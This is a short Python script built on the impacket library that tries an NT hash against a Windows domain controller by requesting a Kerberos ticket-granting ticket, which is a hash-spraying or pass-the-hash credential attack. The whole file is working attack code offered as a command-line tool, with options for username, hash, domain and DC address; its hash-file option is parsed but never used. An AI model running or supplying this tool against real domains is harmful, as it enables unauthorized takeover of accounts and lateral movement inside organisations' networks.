import argparse
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal
from impacket.krb5 import constants
import socket
from binascii import unhexlify

class PschittKerberos:
    def __init__(self, user, domain, hash, password=None, aesKey=None, dc_ip=None):
        self.user = user
        self.domain = domain
        self.hash = hash
        self.password = password
        self.aesKey = aesKey
        self.dc_ip = dc_ip

    def spray(self):
        lmhash = None
        nthash = self.hash
        try:
            principal_krb = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            auth = getKerberosTGT(principal_krb, self.password, self.domain, lmhash, unhexlify(nthash), self.aesKey, self.dc_ip)
            print("result :", auth)
        except KerberosError as e:
            print(e)
            return
        except socket.error as e:
            print('[-] Could not connect to DC')
            return

def main():
    parser = argparse.ArgumentParser(description="Ca spray fort !")
    parser.add_argument('-username', help='Username used to spray NTLM hash(es)')
    parser.add_argument('-hashes', help="NT hash to spray")
    parser.add_argument('-hashfile', help='NT hashes file to spray')
    parser.add_argument('-domain', required=True, help="Target domain")
    parser.add_argument('-dc', help="DC IP")

    args = parser.parse_args()

    kerberos_sprayer = PschittKerberos(
            user=args.username,
            domain=args.domain,
            hash=args.hashes,
            password=None,
            aesKey=None,
            dc_ip=args.dc
        )
    kerberos_sprayer.spray()

if __name__ == "__main__":
    main()